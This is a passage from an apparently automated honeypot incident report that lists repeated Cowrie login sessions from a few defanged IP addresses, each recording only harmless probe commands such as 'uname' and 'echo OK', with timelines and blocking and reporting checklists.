| `2026-06-27 14:01:01` | `cowrie.log.closed` |
| `2026-06-27 14:01:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15a9ba58a8cb

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:01 |
| **Last Seen** | 2026-06-27 14:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:01:46` | `cowrie.session.connect` |
| `2026-06-27 14:01:46` | `cowrie.client.version` |
| `2026-06-27 14:01:46` | `cowrie.client.kex` |
| `2026-06-27 14:01:47` | `cowrie.login.success` |
| `2026-06-27 14:01:48` | `cowrie.session.params` |
| `2026-06-27 14:01:48` | `cowrie.command.input` |
| `2026-06-27 14:01:48` | `cowrie.log.closed` |
| `2026-06-27 14:01:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-380857afd5fd

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 14:02 |
| **Last Seen** | 2026-06-27 14:02 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:02:32` | `cowrie.session.connect` |
| `2026-06-27 14:02:34` | `cowrie.client.version` |
| `2026-06-27 14:02:34` | `cowrie.client.kex` |
| `2026-06-27 14:02:39` | `cowrie.login.success` |
| `2026-06-27 14:02:43` | `cowrie.session.params` |
| `2026-06-27 14:02:43` | `cowrie.command.input` |
| `2026-06-27 14:02:44` | `cowrie.log.closed` |
| `2026-06-27 14:02:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39cada2eb491

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:02 |
| **Last Seen** | 2026-06-27 14:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:02:32` | `cowrie.session.connect` |
| `2026-06-27 14:02:32` | `cowrie.client.version` |
| `2026-06-27 14:02:32` | `cowrie.client.kex` |
| `2026-06-27 14:02:33` | `cowrie.login.success` |
| `2026-06-27 14:02:33` | `cowrie.session.params` |
| `2026-06-27 14:02:33` | `cowrie.command.input` |
| `2026-06-27 14:02:33` | `cowrie.log.closed` |
| `2026-06-27 14:02:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8a565f22939

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:03 |
| **Last Seen** | 2026-06-27 14:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:03:19` | `cowrie.session.connect` |
| `2026-06-27 14:03:19` | `cowrie.client.version` |
| `2026-06-27 14:03:19` | `cowrie.client.kex` |
| `2026-06-27 14:03:19` | `cowrie.login.success` |
| `2026-06-27 14:03:20` | `cowrie.session.params` |
| `2026-06-27 14:03:20` | `cowrie.command.input` |
| `2026-06-27 14:03:20` | `cowrie.log.closed` |
| `2026-06-27 14:03:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-395defc4d034

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:04 |
| **Last Seen** | 2026-06-27 14:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:04:05` | `cowrie.session.connect` |
| `2026-06-27 14:04:05` | `cowrie.client.version` |
| `2026-06-27 14:04:06` | `cowrie.client.kex` |
| `2026-06-27 14:04:06` | `cowrie.login.success` |
| `2026-06-27 14:04:07` | `cowrie.session.params` |
| `2026-06-27 14:04:07` | `cowrie.command.input` |
| `2026-06-27 14:04:07` | `cowrie.log.closed` |
| `2026-06-27 14:04:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05e1de334285

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:04 |
| **Last Seen** | 2026-06-27 14:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:04:52` | `cowrie.session.connect` |
| `2026-06-27 14:04:52` | `cowrie.client.version` |
| `2026-06-27 14:04:52` | `cowrie.client.kex` |
| `2026-06-27 14:04:52` | `cowrie.login.success` |
| `2026-06-27 14:04:53` | `cowrie.session.params` |
| `2026-06-27 14:04:53` | `cowrie.command.input` |
| `2026-06-27 14:04:53` | `cowrie.log.closed` |
| `2026-06-27 14:04:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce72198311c6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:05 |
| **Last Seen** | 2026-06-27 14:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:05:38` | `cowrie.session.connect` |
| `2026-06-27 14:05:38` | `cowrie.client.version` |
| `2026-06-27 14:05:38` | `cowrie.client.kex` |
| `2026-06-27 14:05:39` | `cowrie.login.success` |
| `2026-06-27 14:05:39` | `cowrie.session.params` |
| `2026-06-27 14:05:39` | `cowrie.command.input` |
| `2026-06-27 14:05:39` | `cowrie.log.closed` |
| `2026-06-27 14:05:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e432d34cfc1b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:06 |
| **Last Seen** | 2026-06-27 14:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:06:25` | `cowrie.session.connect` |
| `2026-06-27 14:06:25` | `cowrie.client.version` |
| `2026-06-27 14:06:25` | `cowrie.client.kex` |
| `2026-06-27 14:06:25` | `cowrie.login.success` |
| `2026-06-27 14:06:26` | `cowrie.session.params` |
| `2026-06-27 14:06:26` | `cowrie.command.input` |
| `2026-06-27 14:06:26` | `cowrie.log.closed` |
| `2026-06-27 14:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93f153d316cc

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:07 |
| **Last Seen** | 2026-06-27 14:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:07:10` | `cowrie.session.connect` |
| `2026-06-27 14:07:10` | `cowrie.client.version` |
| `2026-06-27 14:07:10` | `cowrie.client.kex` |
| `2026-06-27 14:07:11` | `cowrie.login.success` |
| `2026-06-27 14:07:12` | `cowrie.session.params` |
| `2026-06-27 14:07:12` | `cowrie.command.input` |
| `2026-06-27 14:07:12` | `cowrie.log.closed` |
| `2026-06-27 14:07:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29c8ecdcef49

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:07 |
| **Last Seen** | 2026-06-27 14:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:07:56` | `cowrie.session.connect` |
| `2026-06-27 14:07:56` | `cowrie.client.version` |
| `2026-06-27 14:07:57` | `cowrie.client.kex` |
| `2026-06-27 14:07:57` | `cowrie.login.success` |
| `2026-06-27 14:07:58` | `cowrie.session.params` |
| `2026-06-27 14:07:58` | `cowrie.command.input` |
| `2026-06-27 14:07:58` | `cowrie.log.closed` |
| `2026-06-27 14:07:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8ef4084e6d5

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:08 |
| **Last Seen** | 2026-06-27 14:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:08:43` | `cowrie.session.connect` |
| `2026-06-27 14:08:43` | `cowrie.client.version` |
| `2026-06-27 14:08:43` | `cowrie.client.kex` |
| `2026-06-27 14:08:44` | `cowrie.login.success` |
| `2026-06-27 14:08:45` | `cowrie.session.params` |
| `2026-06-27 14:08:45` | `cowrie.command.input` |
| `2026-06-27 14:08:45` | `cowrie.log.closed` |
| `2026-06-27 14:08:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-551f486eea31

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:09 |
| **Last Seen** | 2026-06-27 14:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:09:32` | `cowrie.session.connect` |
| `2026-06-27 14:09:32` | `cowrie.client.version` |
| `2026-06-27 14:09:32` | `cowrie.client.kex` |
| `2026-06-27 14:09:32` | `cowrie.login.success` |
| `2026-06-27 14:09:33` | `cowrie.session.params` |
| `2026-06-27 14:09:33` | `cowrie.command.input` |
| `2026-06-27 14:09:33` | `cowrie.log.closed` |
| `2026-06-27 14:09:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93515b88934e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:10 |
| **Last Seen** | 2026-06-27 14:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:10:24` | `cowrie.session.connect` |
| `2026-06-27 14:10:24` | `cowrie.client.version` |
| `2026-06-27 14:10:24` | `cowrie.client.kex` |
| `2026-06-27 14:10:24` | `cowrie.login.success` |
| `2026-06-27 14:10:25` | `cowrie.session.params` |
| `2026-06-27 14:10:25` | `cowrie.command.input` |
| `2026-06-27 14:10:25` | `cowrie.log.closed` |
| `2026-06-27 14:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-292555191759

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:11 |
| **Last Seen** | 2026-06-27 14:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:11:13` | `cowrie.session.connect` |
| `2026-06-27 14:11:13` | `cowrie.client.version` |
| `2026-06-27 14:11:13` | `cowrie.client.kex` |
| `2026-06-27 14:11:14` | `cowrie.login.success` |
| `2026-06-27 14:11:14` | `cowrie.session.params` |
| `2026-06-27 14:11:14` | `cowrie.command.input` |
| `2026-06-27 14:11:15` | `cowrie.log.closed` |
| `2026-06-27 14:11:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5e44ed4912c

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-27 14:11 |
| **Last Seen** | 2026-06-27 14:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:11:32` | `cowrie.session.connect` |
| `2026-06-27 14:11:32` | `cowrie.client.version` |
| `2026-06-27 14:11:32` | `cowrie.client.kex` |
| `2026-06-27 14:11:34` | `cowrie.login.success` |
| `2026-06-27 14:11:35` | `cowrie.session.params` |
| `2026-06-27 14:11:35` | `cowrie.command.input` |
| `2026-06-27 14:11:36` | `cowrie.log.closed` |
| `2026-06-27 14:11:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b52ede4654b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:12 |
| **Last Seen** | 2026-06-27 14:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:12:02` | `cowrie.session.connect` |
| `2026-06-27 14:12:02` | `cowrie.client.version` |
| `2026-06-27 14:12:02` | `cowrie.client.kex` |
| `2026-06-27 14:12:02` | `cowrie.login.success` |
| `2026-06-27 14:12:03` | `cowrie.session.params` |
| `2026-06-27 14:12:03` | `cowrie.command.input` |
| `2026-06-27 14:12:03` | `cowrie.log.closed` |
| `2026-06-27 14:12:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-124136fab938

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:12 |
| **Last Seen** | 2026-06-27 14:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:12:49` | `cowrie.session.connect` |
| `2026-06-27 14:12:49` | `cowrie.client.version` |
| `2026-06-27 14:12:49` | `cowrie.client.kex` |
| `2026-06-27 14:12:50` | `cowrie.login.success` |
| `2026-06-27 14:12:51` | `cowrie.session.params` |
| `2026-06-27 14:12:51` | `cowrie.command.input` |
| `2026-06-27 14:12:51` | `cowrie.log.closed` |
| `2026-06-27 14:12:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e0dcc191f7d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:13 |
| **Last Seen** | 2026-06-27 14:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:13:37` | `cowrie.session.connect` |
| `2026-06-27 14:13:37` | `cowrie.client.version` |
| `2026-06-27 14:13:37` | `cowrie.client.kex` |
| `2026-06-27 14:13:37` | `cowrie.login.success` |
| `2026-06-27 14:13:38` | `cowrie.session.params` |
| `2026-06-27 14:13:38` | `cowrie.command.input` |
| `2026-06-27 14:13:38` | `cowrie.log.closed` |
| `2026-06-27 14:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b1d2649a1e0

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-27 14:14 |
| **Last Seen** | 2026-06-27 14:14 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:14:12` | `cowrie.session.connect` |
| `2026-06-27 14:14:14` | `cowrie.client.version` |
| `2026-06-27 14:14:14` | `cowrie.client.kex` |
| `2026-06-27 14:14:20` | `cowrie.login.success` |
| `2026-06-27 14:14:23` | `cowrie.session.params` |
| `2026-06-27 14:14:23` | `cowrie.command.input` |
| `2026-06-27 14:14:25` | `cowrie.log.closed` |
| `2026-06-27 14:14:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19962ec3be78

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:14 |
| **Last Seen** | 2026-06-27 14:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:14:26` | `cowrie.session.connect` |
| `2026-06-27 14:14:26` | `cowrie.client.version` |
| `2026-06-27 14:14:26` | `cowrie.client.kex` |
| `2026-06-27 14:14:26` | `cowrie.login.success` |
| `2026-06-27 14:14:27` | `cowrie.session.params` |
| `2026-06-27 14:14:27` | `cowrie.command.input` |
| `2026-06-27 14:14:27` | `cowrie.log.closed` |
| `2026-06-27 14:14:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19d7189cc7b0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:15 |
| **Last Seen** | 2026-06-27 14:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:15:15` | `cowrie.session.connect` |
| `2026-06-27 14:15:15` | `cowrie.client.version` |
| `2026-06-27 14:15:15` | `cowrie.client.kex` |
| `2026-06-27 14:15:16` | `cowrie.login.success` |
| `2026-06-27 14:15:16` | `cowrie.session.params` |
| `2026-06-27 14:15:16` | `cowrie.command.input` |
| `2026-06-27 14:15:17` | `cowrie.log.closed` |
| `2026-06-27 14:15:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-783273f5d247

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:16 |
| **Last Seen** | 2026-06-27 14:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:16:07` | `cowrie.session.connect` |
| `2026-06-27 14:16:07` | `cowrie.client.version` |
| `2026-06-27 14:16:07` | `cowrie.client.kex` |
| `2026-06-27 14:16:08` | `cowrie.login.success` |
| `2026-06-27 14:16:09` | `cowrie.session.params` |
| `2026-06-27 14:16:09` | `cowrie.command.input` |
| `2026-06-27 14:16:09` | `cowrie.log.closed` |
| `2026-06-27 14:16:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32d5d675f254

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:16 |
| **Last Seen** | 2026-06-27 14:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:16:59` | `cowrie.session.connect` |
| `2026-06-27 14:16:59` | `cowrie.client.version` |
| `2026-06-27 14:16:59` | `cowrie.client.kex` |
| `2026-06-27 14:17:00` | `cowrie.login.success` |
| `2026-06-27 14:17:00` | `cowrie.session.params` |
| `2026-06-27 14:17:00` | `cowrie.command.input` |
| `2026-06-27 14:17:01` | `cowrie.log.closed` |
| `2026-06-27 14:17:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4846d7ef265a

| Field | Detail |
|---|---|
| **Source IP** | `120.48.32[.]130` |
| **First Seen** | 2026-06-27 14:17 |
| **Last Seen** | 2026-06-27 14:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:17:39` | `cowrie.session.connect` |
| `2026-06-27 14:17:41` | `cowrie.telnet.option` |
| `2026-06-27 14:17:41` | `cowrie.telnet.option` |
| `2026-06-27 14:18:41` | `cowrie.login.success` |
| `2026-06-27 14:18:42` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `120.48.32[.]130` to AbuseIPDB if not already reported
- [ ] Block `120.48.32[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a65f7242fca

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:17 |
| **Last Seen** | 2026-06-27 14:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:17:51` | `cowrie.session.connect` |
| `2026-06-27 14:17:51` | `cowrie.client.version` |
| `2026-06-27 14:17:51` | `cowrie.client.kex` |
| `2026-06-27 14:17:51` | `cowrie.login.success` |
| `2026-06-27 14:17:52` | `cowrie.session.params` |
| `2026-06-27 14:17:52` | `cowrie.command.input` |
| `2026-06-27 14:17:52` | `cowrie.log.closed` |
| `2026-06-27 14:17:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fb2fb8516e5

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-27 14:18 |
| **Last Seen** | 2026-06-27 14:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-27 14:18:42` | `cowrie.session.connect` |
| `2026-06-27 14:18:42` | `cowrie.client.version` |
| `2026-06-27 14:18:42` | `cowrie.client.kex` |
| `2026-06-27 14:18:43` | `cowrie.login.success` |
| `2026-06-27 14:18:43` | `cowrie.session.params` |
